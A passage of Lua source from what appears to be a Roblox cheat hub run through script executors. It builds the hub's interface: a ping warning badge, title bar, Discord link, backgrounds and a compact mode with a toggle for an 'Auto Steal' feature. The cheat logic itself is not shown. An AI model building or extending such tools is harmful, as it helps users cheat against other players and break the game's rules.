	local icon   = (kind=="off" and "\226\156\151") or (kind=="info" and "\226\128\162") or "\226\156\147"

	local card = Instance.new("Frame", toastLayer)
	card.Size = UDim2.new(0,0,0,24); card.AutomaticSize = Enum.AutomaticSize.X
	card.BackgroundColor3 = Color3.fromRGB(6,8,14); card.BackgroundTransparency = 1
	card.BorderSizePixel = 0; card.LayoutOrder = order; card.ZIndex = 200
	addCorner(card, 8)
	local stroke = addStroke(card, accent, 1, 1)
	local pad = Instance.new("UIPadding", card)
	pad.PaddingLeft = UDim.new(0,10); pad.PaddingRight = UDim.new(0,10)

	local row = Instance.new("Frame", card)
	row.Size = UDim2.new(0,0,1,0); row.AutomaticSize = Enum.AutomaticSize.X
	row.BackgroundTransparency = 1; row.ZIndex = 201
	local rowLL = Instance.new("UIListLayout", row)
	rowLL.FillDirection = Enum.FillDirection.Horizontal
	rowLL.VerticalAlignment = Enum.VerticalAlignment.Center
	rowLL.Padding = UDim.new(0,6)

	local iconLbl = Instance.new("TextLabel", row)
	iconLbl.Size = UDim2.new(0,12,1,0); iconLbl.BackgroundTransparency = 1
	iconLbl.Text = icon; iconLbl.TextColor3 = accent; iconLbl.TextTransparency = 1
	iconLbl.Font = Enum.Font.GothamBlack; iconLbl.TextSize = 11; iconLbl.ZIndex = 201

	local txtLbl = Instance.new("TextLabel", row)
	txtLbl.Size = UDim2.new(0,0,1,0); txtLbl.AutomaticSize = Enum.AutomaticSize.X
	txtLbl.BackgroundTransparency = 1; txtLbl.Text = text
	txtLbl.TextColor3 = C_WHITE; txtLbl.TextTransparency = 1
	txtLbl.Font = Enum.Font.GothamBold; txtLbl.TextSize = 10; txtLbl.ZIndex = 201

	TweenService:Create(card, TweenInfo.new(0.18), {BackgroundTransparency=0.15}):Play()
	TweenService:Create(stroke, TweenInfo.new(0.18), {Transparency=0.2}):Play()
	TweenService:Create(iconLbl, TweenInfo.new(0.18), {TextTransparency=0}):Play()
	TweenService:Create(txtLbl, TweenInfo.new(0.18), {TextTransparency=0}):Play()

	task.delay(1.4, function()
		if not card or not card.Parent then return end
		TweenService:Create(card, TweenInfo.new(0.25), {BackgroundTransparency=1}):Play()
		TweenService:Create(stroke, TweenInfo.new(0.25), {Transparency=1}):Play()
		TweenService:Create(iconLbl, TweenInfo.new(0.25), {TextTransparency=1}):Play()
		TweenService:Create(txtLbl, TweenInfo.new(0.25), {TextTransparency=1}):Play()
		task.wait(0.26)
		if card then card:Destroy() end
	end)
end
_GH.showToast = showToast

-- ===================================================================
-- PING WARNING BADGE  — "DON'T DUEL"
-- Persistent floating banner, top-center, only visible when ping
-- exceeds the threshold. Pulses red, shows live ms value.
-- Uses the same visual vocabulary as the rest of the hub
-- (living stroke, GothamBlack, corner radius, TweenService).
-- ===================================================================
do
	-- ── Layout ───────────────────────────────────────────────────
	-- Shrunk (210x30→185x26) and nudged higher (72→70) per request. The
	-- StealBarWidget's bottom edge is a hard floor at y=67 (see below) —
	-- moving further up than this would start clipping into it, so the
	-- clearance was trimmed from 5px to 3px instead, still non-overlapping.
	local BADGE_W, BADGE_H = 185, 26
	-- StealBarWidget (the "Auto Grab" pill) sits at y=35, height 32 → bottom
	-- edge at y=67. Badge starts a few px below that so the two never
	-- overlap, whichever one is currently visible.
	local BADGE_Y_SHOW = 70       -- pixels from top when visible
	local BADGE_Y_HIDE = -BADGE_H - 10  -- off-screen above

	local badge = Instance.new("Frame", gui)
	badge.Name        = "PingWarnBadge"
	badge.AnchorPoint = Vector2.new(0.5, 0)
	badge.Size        = UDim2.new(0, BADGE_W, 0, BADGE_H)
	badge.Position    = UDim2.new(0.5, 0, 0, BADGE_Y_HIDE)
	badge.BackgroundColor3 = Color3.fromRGB(10, 4, 4)
	badge.BackgroundTransparency = 0
	badge.BorderSizePixel = 0
	badge.ZIndex      = 300
	badge.Visible     = false
	badge.ClipsDescendants = false
	addCorner(badge, 9)

	-- Left accent stripe
	local stripe = Instance.new("Frame", badge)
	stripe.Size = UDim2.new(0, 3, 1, -6)
	stripe.Position = UDim2.new(0, 6, 0.5, 0)
	stripe.AnchorPoint = Vector2.new(0, 0.5)
	stripe.BackgroundColor3 = C_RED
	stripe.BorderSizePixel = 0
	stripe.ZIndex = 301
	addCorner(stripe, 2)

	-- Warning icon
	local iconLbl = Instance.new("TextLabel", badge)
	iconLbl.Size              = UDim2.new(0, 16, 1, 0)
	iconLbl.Position          = UDim2.new(0, 12, 0, 0)
	iconLbl.BackgroundTransparency = 1
	iconLbl.Text              = "⚠"
	iconLbl.TextColor3        = C_RED
	iconLbl.Font              = Enum.Font.GothamBlack
	iconLbl.TextSize          = 13
	iconLbl.TextXAlignment    = Enum.TextXAlignment.Center
	iconLbl.ZIndex            = 302
	local iconScale = Instance.new("UIScale", iconLbl)
	iconScale.Scale = 1

	-- Main message
	local msgLbl = Instance.new("TextLabel", badge)
	msgLbl.Size             = UDim2.new(1, -96, 1, 0)
	msgLbl.Position         = UDim2.new(0, 32, 0, 0)
	msgLbl.BackgroundTransparency = 1
	msgLbl.Text             = "DON'T DUEL"
	msgLbl.TextColor3       = C_RED
	msgLbl.Font             = Enum.Font.GothamBlack
	msgLbl.TextSize         = 10
	msgLbl.TextXAlignment   = Enum.TextXAlignment.Left
	msgLbl.ZIndex           = 302

	-- Live ping value (right side)
	local pingLbl = Instance.new("TextLabel", badge)
	pingLbl.Size            = UDim2.new(0, 54, 1, 0)
	pingLbl.Position        = UDim2.new(1, -58, 0, 0)
	pingLbl.BackgroundTransparency = 1
	pingLbl.Text            = "---ms"
	pingLbl.TextColor3      = Color3.fromRGB(255, 120, 120)
	pingLbl.Font            = Enum.Font.GothamBold
	pingLbl.TextSize        = 9
	pingLbl.TextXAlignment  = Enum.TextXAlignment.Right
	pingLbl.ZIndex          = 302

	-- Outer glow stroke — pulsing red
	local badgeStroke = addStroke(badge, C_RED, 1.2, 0.3)

	-- ── Pulse animation (runs while warning is visible) ───────────
	local _badgePulseRunning = false

	local function _badgeStartPulse()
		if _badgePulseRunning then return end
		_badgePulseRunning = true
		task.spawn(function()
			while _badgePulseRunning and badge and badge.Parent do
				TweenService:Create(badgeStroke,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{Transparency = 0.0, Thickness = 2.0}):Play()
				TweenService:Create(badge,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundColor3 = Color3.fromRGB(28, 6, 6)}):Play()
				TweenService:Create(stripe,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
				TweenService:Create(iconScale,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{Scale = 1.18}):Play()
				task.wait(0.55)
				if not _badgePulseRunning then break end
				TweenService:Create(badgeStroke,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{Transparency = 0.55, Thickness = 1.2}):Play()
				TweenService:Create(badge,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundColor3 = Color3.fromRGB(10, 4, 4)}):Play()
				TweenService:Create(stripe,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{BackgroundColor3 = C_RED}):Play()
				TweenService:Create(iconScale,
					TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
					{Scale = 1.0}):Play()
				task.wait(0.55)
			end
		end)
	end

	local function _badgeStopPulse()
		_badgePulseRunning = false
		pcall(function()
			TweenService:Create(badgeStroke, TweenInfo.new(0.2), {Transparency = 0.3, Thickness = 1.2}):Play()
			TweenService:Create(badge, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(10, 4, 4)}):Play()
			TweenService:Create(stripe, TweenInfo.new(0.2), {BackgroundColor3 = C_RED}):Play()
			TweenService:Create(iconScale, TweenInfo.new(0.2), {Scale = 1.0}):Play()
		end)
	end

	-- ── Show / hide with slide animation ─────────────────────────
	local _badgeVisible = false

	-- Small aesthetic touch: a soft red halo that flashes behind the badge
	-- the instant it arrives, then fades — same disposable-Frame pattern as
	-- moonAbsorbFlash elsewhere in the hub, so it can't affect the badge
	-- itself (separate Instance, destroys itself, touches nothing else).
	local function _badgeArrivalFlash()
		local ring = Instance.new("Frame", gui)
		ring.AnchorPoint = Vector2.new(0.5, 0)
		ring.Position = UDim2.new(0.5, 0, 0, BADGE_Y_SHOW)
		ring.Size = UDim2.new(0, BADGE_W, 0, BADGE_H)
		ring.BackgroundColor3 = C_RED; ring.BackgroundTransparency = 0.35
		ring.BorderSizePixel = 0; ring.ZIndex = 299
		addCorner(ring, 9)
		TweenService:Create(ring, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, BADGE_W + 26, 0, BADGE_H + 26),
			Position = UDim2.new(0.5, 0, 0, BADGE_Y_SHOW - 13),
			BackgroundTransparency = 1,
		}):Play()
		task.delay(0.42, function() if ring then ring:Destroy() end end)
	end

	local function _badgeShow(pingMs)
		pingLbl.Text = tostring(pingMs) .. "ms"
		if _badgeVisible then return end
		_badgeVisible = true
		badge.Visible = true
		TweenService:Create(badge,
			TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
			{Position = UDim2.new(0.5, 0, 0, BADGE_Y_SHOW)}):Play()
		_badgeStartPulse()
		_badgeArrivalFlash()
	end

	local function _badgeHide()
		if not _badgeVisible then return end
		_badgeVisible = false
		_badgeStopPulse()
		TweenService:Create(badge,
			TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
			{Position = UDim2.new(0.5, 0, 0, BADGE_Y_HIDE)}):Play()
		task.delay(0.24, function()
			if not _badgeVisible and badge and badge.Parent then
				badge.Visible = false
			end
		end)
	end

	-- ── Update live ping label while already visible ──────────────
	local function _badgeUpdate(pingMs)
		pingLbl.Text = tostring(pingMs) .. "ms"
	end

	-- ── Register with the monitor ─────────────────────────────────
	_GH.pingRegister(function(isWarn, ms)
		if isWarn then
			if _badgeVisible then
				_badgeUpdate(ms)
			else
				_badgeShow(ms)
			end
		else
			_badgeHide()
		end
	end)

	-- Expose for external cleanup if needed
	_GH.hidePingBadge = _badgeHide
end

-- ===================================================================
-- MAIN OUTER PANEL
-- ===================================================================
local WIN_W, WIN_H = 300, 340
-- [BUGFIX] +14px to fit a 3rd line (Discord badge) under the username,
-- without crowding the existing title/username row. Everything below
-- (titleDiv, CONTENT_Y, contentBg, COMPACT_H) derives from this value, so
-- the whole layout adjusts automatically — nothing else needed changing.
local TITLE_H = 48

local mainOuter = Instance.new("Frame", gui)
mainOuter.Name = "MainOuter"
mainOuter.Size = UDim2.new(0,WIN_W,0,WIN_H)
mainOuter.Position = UDim2.new(0.5,-WIN_W/2,0.5,-137)
mainOuter.BackgroundTransparency = 1; mainOuter.BorderSizePixel = 0
mainOuter.ClipsDescendants = true; mainOuter.Active = true
local mainCorner = addCorner(mainOuter, 24); makeDraggable(mainOuter, nil, "main")
local mainUIScale = Instance.new("UIScale", mainOuter)

local bgImg = Instance.new("Frame", mainOuter)
bgImg.Name = "BgFill"; bgImg.Size = UDim2.new(1,0,1,0)
bgImg.BackgroundColor3 = C_BG; bgImg.BorderSizePixel = 0; bgImg.ZIndex = 0
local bgCorner = addCorner(bgImg, 24)

-- ===================================================================
-- CUSTOM BACKGROUND IMAGE — toggled by the "Personalize" row in
-- Settings and Theme tabs. ImageLabel sits on top of the solid bgImg
-- fill (ZIndex 1), fully transparent until Personalize is ON.
-- ScaleType.Crop keeps the image filling the panel without distortion.
-- ===================================================================
local _bgImageLabel = Instance.new("ImageLabel", bgImg)
_bgImageLabel.Name               = "BgImage"
_bgImageLabel.Size               = UDim2.new(1, 0, 1, 0)
_bgImageLabel.ZIndex             = 1
_bgImageLabel.BackgroundTransparency = 1
_bgImageLabel.BorderSizePixel    = 0
_bgImageLabel.Image              = "rbxassetid://116324254515657"
_bgImageLabel.ScaleType          = Enum.ScaleType.Crop
_bgImageLabel.ImageTransparency  = 0   -- visible immédiatement (ON par défaut)
addCorner(_bgImageLabel, 24)
-- fond solide légèrement dimé pour laisser le background respirer
bgImg.BackgroundTransparency = 0.18

-- Personalize activé par défaut
local _personalizeEnabled = true

local function _setPersonalize(on)
	_personalizeEnabled = on
	-- Instantané : pas de Tween, l'image s'affiche/disparaît direct
	_bgImageLabel.ImageTransparency = on and 0 or 1
	bgImg.BackgroundTransparency    = on and 0.18 or 0
end
_GH.setPersonalize = _setPersonalize
_GH.getPersonalize = function() return _personalizeEnabled end

-- Registry for the "Buttons" tab row background-windows (see
-- UIB.makeToggleRow) — one hook here keeps every one of them in sync with
-- whichever image is actually active, regardless of what changed it
-- (thumbnail click, saved-state restore, theme switch turning personalize
-- off…), instead of wiring every call site that touches _bgImageLabel.Image.
-- [BUGFIX] This whole block used to sit BEFORE _personalizeEnabled's own
-- declaration above — _syncButtonsBgWindows referenced it as a closure
-- upvalue from a point in the file where that local didn't exist yet, so
-- it silently resolved to a nil global instead, making `allowed` always
-- false and the whole feature a no-op ("aucune image" — same class of
-- forward-reference bug seen elsewhere in this file). Moved after both
-- _personalizeEnabled and _setPersonalize now exist.
-- Restricted to exactly these 2 images — Bg 2 (throne) and Bg 3
-- (swordsman). Any other active background (Moon, Bg 1, None) means no
-- spawned button shows an image.
local _buttonsBgAllowedIds = { [114200523225317] = true, [139741219491406] = true }
-- [SIMPLIFIED] No longer gated on whether the button is active — "ça doit
-- être comme l'ui, dès que je choisis l'image y'a le background, pareil
-- pour les boutons": exactly like the main panel itself (shows whichever
-- image is picked, immediately, full stop) — every spawned floating
-- button shows it the moment an allowed image is selected, active or not.
-- Registered by makeFloatButton below.
local _floatBgEntries = {}
local function _syncButtonsBgWindows()
	local idNum = tonumber(_bgImageLabel.Image:match("(%d+)$"))
	local allowed = _personalizeEnabled and idNum ~= nil and _buttonsBgAllowedIds[idNum]
	for _, e in ipairs(_floatBgEntries) do
		if allowed then e.bgWindow.Image = _bgImageLabel.Image end
		e.bgWindow.Visible = allowed
		e.dim.Visible = allowed
	end
end
-- Both properties, not just Image: picking "None" leaves .Image alone and
-- only flips .ImageTransparency to 1 via _setPersonalize (see its thumbnail
-- click handler above) — Image-only would miss that case and keep a stale
-- image window showing after the user turned the background off.
_bgImageLabel:GetPropertyChangedSignal("Image"):Connect(_syncButtonsBgWindows)
_bgImageLabel:GetPropertyChangedSignal("ImageTransparency"):Connect(_syncButtonsBgWindows)

local mainStroke, mainStrokeGrad = addLivingStroke(mainOuter, 2)
-- Brighter "living gradient" sweep for the main panel border specifically —
-- addLivingStroke's default keypoints (C_DEEP1/C_DEEP2) are near-black and
-- barely readable against the panel background. Only mainStroke's own
-- gradient is swapped here (moon-blue tones); every other addLivingStroke
-- caller (buttons, rows, …) keeps its original subtle look untouched.
-- Still rotates via the same shared loop — g was already registered there.
if mainStrokeGrad then
	mainStrokeGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0,    C_MOON),
		ColorSequenceKeypoint.new(0.25, C_DEEP4),
		ColorSequenceKeypoint.new(0.5,  C_MOON2),
		ColorSequenceKeypoint.new(0.75, C_DEEP4),
		ColorSequenceKeypoint.new(1,    C_MOON),
	})
end

-- THEME TRANSITION — a brief full-panel veil that dips in right as a theme
-- switch's instant color-swap happens, then fades back out, so the switch
-- reads as a soft animated crossfade instead of a hard color-snap. Same
-- non-invasive pattern as tabFlash below: one overlay Frame, zero properties
-- touched on the real widgets — applyTheme's actual swap logic is untouched.
local themeFlash = Instance.new("Frame", mainOuter)
themeFlash.Name = "ThemeFlash"; themeFlash.Size = UDim2.new(1,0,1,0)
themeFlash.BackgroundColor3 = Color3.fromRGB(0,0,0); themeFlash.BackgroundTransparency = 1
themeFlash.BorderSizePixel = 0; themeFlash.ZIndex = 50; themeFlash.Active = false
addCorner(themeFlash, 24)
local function playThemeTransition()
	TweenService:Create(themeFlash, TweenInfo.new(0.10, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency=0.4}):Play()
	task.delay(0.10, function()
		TweenService:Create(themeFlash, TweenInfo.new(0.32, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency=1}):Play()
	end)
end
_GH.playThemeTransition = playThemeTransition

-- ===================================================================
-- TITLE BAR
-- ===================================================================
local titleBar = Instance.new("Frame", mainOuter)
titleBar.Size = UDim2.new(1,0,0,TITLE_H); titleBar.BackgroundTransparency = 1
titleBar.BorderSizePixel = 0; titleBar.ZIndex = 5

-- AVATAR — shows who's running the hub (LocalPlayer's own headshot only,
-- fetched via the normal Roblox thumbnail API). Wrapped in pcall + task.spawn
-- so a blocked/slow fetch on some executors just leaves the little frame
-- empty — never blocks or breaks the rest of the UI build.
-- Enlarged 20→26px; still fits the 34px-tall title bar with margin to spare.
local avatarImg = Instance.new("ImageLabel", titleBar)
avatarImg.Size = UDim2.new(0,26,0,26); avatarImg.Position = UDim2.new(0,8,0,4)
avatarImg.BackgroundColor3 = C_OFF_BG; avatarImg.BackgroundTransparency = 0.1
avatarImg.BorderSizePixel = 0; avatarImg.ZIndex = 6; avatarImg.Image = ""
addCorner(avatarImg, 13); addStroke(avatarImg, C_BORDER, 1, 0.4)
task.spawn(function()
	local ok, content = pcall(function()
		return Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
	end)
	if ok and content and avatarImg.Parent then avatarImg.Image = content end
end)

-- Title text nudged right (14→40) to make room for the bigger avatar, and
-- shrunk from a single 20px line down to the top half of a two-line stack —
-- the brand title itself keeps its exact same text/colour/font, just less
-- vertical room, so nothing about it actually changes besides size.
local titleLbl = Instance.new("TextLabel", titleBar)
titleLbl.Size = UDim2.new(0,150,0,14); titleLbl.Position = UDim2.new(0,40,0,4)
titleLbl.BackgroundTransparency = 1; titleLbl.Text = "MOON - YSLEM X ALN"
titleLbl.TextColor3 = C_WHITE; titleLbl.Font = Enum.Font.GothamBlack; titleLbl.TextSize = 11
titleLbl.TextXAlignment = Enum.TextXAlignment.Left; titleLbl.ZIndex = 6
addLivingTextGradient(titleLbl)

-- Username — bottom half of the stack, directly under the brand title.
local usernameLbl = Instance.new("TextLabel", titleBar)
usernameLbl.Size = UDim2.new(0,150,0,13); usernameLbl.Position = UDim2.new(0,40,0,18)
usernameLbl.BackgroundTransparency = 1; usernameLbl.Text = "@" .. LP.Name
usernameLbl.TextColor3 = C_SILVER2; usernameLbl.Font = Enum.Font.GothamBold; usernameLbl.TextSize = 9
usernameLbl.TextXAlignment = Enum.TextXAlignment.Left; usernameLbl.ZIndex = 6
usernameLbl.TextTruncate = Enum.TextTruncate.AtEnd

-- WELCOME MESSAGE — one toast, fired once when the hub finishes loading.
-- Already includes the username (LP.DisplayName) alongside "Welcome".
-- Small delay so it appears after the panel itself has settled in, not
-- stacked on top of any other startup animation.
task.delay(0.5, function()
	if _GH.showToast then _GH.showToast("Welcome, " .. LP.DisplayName .. "!", "info") end
end)

-- DISCORD BADGE — own row directly under "@Slayix_Chrollo", left-aligned
-- with the title/username stack above it.
-- [BUGFIX] Previously shared the button row (x=180) and sat directly under
-- activeBadge (x=184, ZIndex 7) at a lower ZIndex — rendered hidden behind
-- it. A dedicated 3rd row (TITLE_H grown by 14px above) removes any
-- collision risk regardless of username length, and ZIndex 8 keeps it
-- above every sibling in titleBar either way.
-- [BUGFIX] Widened (120->148px) and TextSize dropped 9->8 — the full link
-- is longer than the old ".gg/..." shorthand and was getting clipped at
-- the old width. mainOuter is 300px wide, so there's ample room here.
local discordBadge = Instance.new("TextButton", titleBar)
discordBadge.Size = UDim2.new(0,148,0,13); discordBadge.Position = UDim2.new(0,40,0,32)
discordBadge.BackgroundColor3 = C_ON_BG; discordBadge.BackgroundTransparency = 0.1
discordBadge.BorderSizePixel = 0; discordBadge.Text = "discord.gg/moonn"
discordBadge.TextColor3 = C_MOON; discordBadge.Font = Enum.Font.GothamBold; discordBadge.TextSize = 8
discordBadge.AutoButtonColor = false; discordBadge.ZIndex = 8
addCorner(discordBadge, 7); addLivingStroke(discordBadge, 1)
discordBadge.MouseEnter:Connect(function() TweenService:Create(discordBadge,TweenInfo.new(0.1),{BackgroundTransparency=0}):Play() end)
discordBadge.MouseLeave:Connect(function() TweenService:Create(discordBadge,TweenInfo.new(0.1),{BackgroundTransparency=0.1}):Play() end)
discordBadge.MouseButton1Click:Connect(function()
	pcall(function() if setclipboard then setclipboard("discord.gg/moonn") end end)
	if _GH.showToast then _GH.showToast("discord.gg/moonn copied", "info") end
end)

-- LOCK button in the title bar (freezes/unfreezes drag)
local lockTitleBtn = Instance.new("TextButton", titleBar)
lockTitleBtn.Size = UDim2.new(0,22,0,22); lockTitleBtn.Position = UDim2.new(1,-56,0.5,-11)
lockTitleBtn.BackgroundColor3 = Color3.fromRGB(0,0,0); lockTitleBtn.BorderSizePixel = 0
lockTitleBtn.Text = "🔓"; lockTitleBtn.TextColor3 = C_WHITE
lockTitleBtn.Font = Enum.Font.GothamBlack; lockTitleBtn.TextSize = 13
lockTitleBtn.ZIndex = 7; addCorner(lockTitleBtn, 8); addLivingStroke(lockTitleBtn, 1)
lockTitleBtn.MouseEnter:Connect(function() TweenService:Create(lockTitleBtn,TweenInfo.new(0.1),{TextColor3=C_MOON2}):Play() end)
lockTitleBtn.MouseLeave:Connect(function() TweenService:Create(lockTitleBtn,TweenInfo.new(0.1),{TextColor3=C_WHITE}):Play() end)
lockTitleBtn.MouseButton1Click:Connect(function()
	_uiLocked = not _uiLocked
	setDragLock(_uiLocked)
	lockTitleBtn.Text = _uiLocked and "🔒" or "🔓"
	lockTitleBtn.TextColor3 = _uiLocked and C_RED or C_WHITE
end)

local closeBtn = Instance.new("TextButton", titleBar)
closeBtn.Size = UDim2.new(0,22,0,22); closeBtn.Position = UDim2.new(1,-30,0.5,-11)
closeBtn.BackgroundColor3 = Color3.fromRGB(0,0,0); closeBtn.BorderSizePixel = 0
closeBtn.Text = "-"; closeBtn.TextColor3 = C_WHITE; closeBtn.Font = Enum.Font.GothamBlack; closeBtn.TextSize = 16
closeBtn.ZIndex = 7; addCorner(closeBtn, 8); addLivingStroke(closeBtn, 1)
closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn,TweenInfo.new(0.1),{TextColor3=C_MOON2}):Play() end)
closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn,TweenInfo.new(0.1),{TextColor3=C_WHITE}):Play() end)

-- No separate compact-mode button anymore — "-" (closeBtn) now triggers
-- setCompactMode directly (wired further below, once it's defined) to
-- avoid two buttons doing the same visible thing.

-- Small "active features" badge — sits between the title and compact/lock/close,
-- stays tiny. Nudged 26px further left (was -90) to make room for the new
-- compact-mode button without overlapping it.
local activeBadge = Instance.new("Frame", titleBar)
activeBadge.Size = UDim2.new(0,30,0,16); activeBadge.Position = UDim2.new(1,-116,0.5,-8)
activeBadge.BackgroundColor3 = Color3.fromRGB(0,0,0); activeBadge.BackgroundTransparency = 0.25
activeBadge.BorderSizePixel = 0; activeBadge.ZIndex = 7
addCorner(activeBadge, 8); addStroke(activeBadge, C_BORDER, 1, 0.35)
local activeDot = Instance.new("Frame", activeBadge)
activeDot.Size = UDim2.new(0,6,0,6); activeDot.Position = UDim2.new(0,7,0.5,-3)
activeDot.BackgroundColor3 = C_DIM; activeDot.BorderSizePixel = 0; addCorner(activeDot, 3)
local activeLbl = Instance.new("TextLabel", activeBadge)
activeLbl.Size = UDim2.new(1,-16,1,0); activeLbl.Position = UDim2.new(0,15,0,0)
activeLbl.BackgroundTransparency = 1; activeLbl.Text = "0"
activeLbl.TextColor3 = C_DIM; activeLbl.Font = Enum.Font.GothamBold; activeLbl.TextSize = 9
activeLbl.TextXAlignment = Enum.TextXAlignment.Left; activeLbl.ZIndex = 7
-- updateActiveBadge() is defined below (after _MH_allToggles exists) so it can
-- scan real toggle state — this keeps it correct even when config-load restores
-- toggles directly via entry.set() instead of going through the click handler.

local titleDiv = Instance.new("Frame", mainOuter)
titleDiv.Size = UDim2.new(1,0,0,1); titleDiv.Position = UDim2.new(0,0,0,TITLE_H)
titleDiv.BackgroundColor3 = C_BORDER; titleDiv.BorderSizePixel = 0; titleDiv.ZIndex = 5

-- ===================================================================
-- CONTENT AREA
-- ===================================================================
local CONTENT_Y = TITLE_H + 1
local contentBg = Instance.new("Frame", mainOuter)
contentBg.Size = UDim2.new(1,0,1,-CONTENT_Y); contentBg.Position = UDim2.new(0,0,0,CONTENT_Y)
contentBg.BackgroundTransparency = 1; contentBg.BorderSizePixel = 0
contentBg.ClipsDescendants = true; contentBg.ZIndex = 2

-- COMPACT MODE strip — shown instead of contentBg when collapsed. Only
-- two live readouts (ping + Auto Steal state), same source as the rest of
-- the hub (LP:GetNetworkPing(), AutoSteal.Enabled) so nothing can disagree.
-- [REVAMP] "mode furtif" réel testé par l'utilisateur = celui-ci (déclenché
-- par "-"), pas le setMinimized 26×26 plus bas — ce dernier n'est atteignable
-- qu'au clavier et n'était donc jamais ce qui était testé. Deux bugs corrigés
-- ici : (1) la taille ne baissait presque pas (300×75, quasi la largeur
-- complète du panneau, avatar/titre/username/discord toujours affichés) →
-- réduit à 140×57 avec le superflu masqué ; (2) aucune transparence n'était
-- appliquée au clic manuel sur "-" (seul le déclenchement par inactivité
-- dimait quoi que ce soit, et même lui ratait _bgImageLabel — voir le
-- [BUGFIX] dans setCompactMode ci-dessous).
local COMPACT_W        = 140
local COMPACT_TITLE_H  = 30
local COMPACT_H = COMPACT_TITLE_H + 1 + 26
local compactStrip = Instance.new("Frame", mainOuter)
compactStrip.Name = "CompactStrip"; compactStrip.Visible = false
compactStrip.Size = UDim2.new(1,0,0,26); compactStrip.Position = UDim2.new(0,0,0,COMPACT_TITLE_H+1)
compactStrip.BackgroundTransparency = 1; compactStrip.ZIndex = 4
local compactPing = Instance.new("TextLabel", compactStrip)
compactPing.Size = UDim2.new(0,44,1,0); compactPing.Position = UDim2.new(0,8,0,0)
compactPing.BackgroundTransparency = 1; compactPing.TextTransparency = 1; compactPing.Text = "-- ms"
compactPing.TextColor3 = C_SILVER; compactPing.Font = Enum.Font.GothamBold; compactPing.TextSize = 11
compactPing.TextXAlignment = Enum.TextXAlignment.Left; compactPing.ZIndex = 5
-- TextButton instead of TextLabel so Auto Steal can be toggled straight from
-- the compact strip — mirrors exactly what the Combat tab's "Auto Steal" row
-- does (same AutoSteal.Enabled + start/stop calls), so both stay in sync no
-- matter which one the user clicks.
-- [REVAMP] Repositionné/rétréci pour tenir dans les 140px du strip réduit
-- (l'ancienne valeur, -154/140px, était calée sur les 300px d'origine et
-- serait sortie du cadre à gauche à cette largeur).
local compactSteal = Instance.new("TextButton", compactStrip)
compactSteal.Size = UDim2.new(0,66,1,0); compactSteal.Position = UDim2.new(1,-74,0,0)
compactSteal.BackgroundTransparency = 1; compactSteal.AutoButtonColor = false
compactSteal.TextTransparency = 1; compactSteal.Text = "STEAL: --"
compactSteal.TextColor3 = C_DIM; compactSteal.Font = Enum.Font.GothamBold; compactSteal.TextSize = 11
compactSteal.TextXAlignment = Enum.TextXAlignment.Right; compactSteal.ZIndex = 5
compactSteal.MouseButton1Click:Connect(function()
	local newOn = not AutoSteal.Enabled
	AutoSteal.Enabled = newOn
	if newOn then startAutoSteal() else stopAutoSteal() end
	if setAutoStealRowVisual then setAutoStealRowVisual(newOn) end
	if _GH.updateActiveBadge then _GH.updateActiveBadge() end
	if _GH.autoSave then _GH.autoSave() end
	if _GH.showToast then _GH.showToast("Auto Steal", newOn and "on" or "off") end
end)

local _compactMode = false
local _savedCompactBgImageAlpha = nil
local function setCompactMode(on)
	_compactMode = on
	local info = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	if on then
		contentBg.Visible = false
		compactStrip.Visible = true
		-- [REVAMP] Masque tout ce qui n'est pas essentiel — avatar/titre/
		-- username/lien discord/badge features actives — pour que la
		-- réduction de largeur (300→140) ne coupe rien à mi-mot au lieu de
		-- juste rétrécir un panneau qui affichait encore tout son contenu.
		avatarImg.Visible = false; titleLbl.Visible = false; usernameLbl.Visible = false
		discordBadge.Visible = false; activeBadge.Visible = false
		-- small aesthetic touch: readouts fade in instead of popping instantly
		compactPing.TextTransparency = 1; compactSteal.TextTransparency = 1
		TweenService:Create(compactPing, TweenInfo.new(0.18), {TextTransparency=0}):Play()
		TweenService:Create(compactSteal, TweenInfo.new(0.18), {TextTransparency=0}):Play()
		-- [SEMI-TRANSPARENT] Pareil que setMinimized plus bas : le fond ET
		-- l'image de background (les deux couches, voir le [BUGFIX] à
		-- _bgImageLabel dans setMinimized) deviennent semi-transparents pour
		-- ne pas cacher totalement ce qu'il y a derrière ("on vois pas
		-- derrière").
		TweenService:Create(bgImg, info, {BackgroundTransparency = 0.6}):Play()
		TweenService:Create(mainStroke, info, {Transparency = 0.55}):Play()
		_savedCompactBgImageAlpha = _bgImageLabel.ImageTransparency
		TweenService:Create(_bgImageLabel, info, {ImageTransparency = 0.75}):Play()
		TweenService:Create(titleBar, info, {Size = UDim2.new(1,0,0,COMPACT_TITLE_H)}):Play()
		TweenService:Create(titleDiv, info, {Position = UDim2.new(0,0,0,COMPACT_TITLE_H)}):Play()
	else
		compactStrip.Visible = false
		contentBg.Visible = true
		avatarImg.Visible = true; titleLbl.Visible = true; usernameLbl.Visible = true
		discordBadge.Visible = true; activeBadge.Visible = true
		-- Undoes the idle-standby dim below, and the semi-transparency above,
		-- if either was active — harmless no-op otherwise (already at these
		-- exact resting values).
